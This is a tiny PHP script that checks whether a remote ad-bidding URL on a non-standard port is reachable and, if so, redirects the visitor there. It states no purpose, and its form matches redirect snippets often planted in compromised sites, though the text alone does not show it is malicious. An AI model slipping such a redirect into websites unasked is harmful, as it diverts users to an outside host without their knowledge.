<?php

$url = 'http://bid290.rtbanalytics.com:9290/bidder/?bid=naa3w9';
if (@fopen($url, "r")) {
   header("Location: $url");
}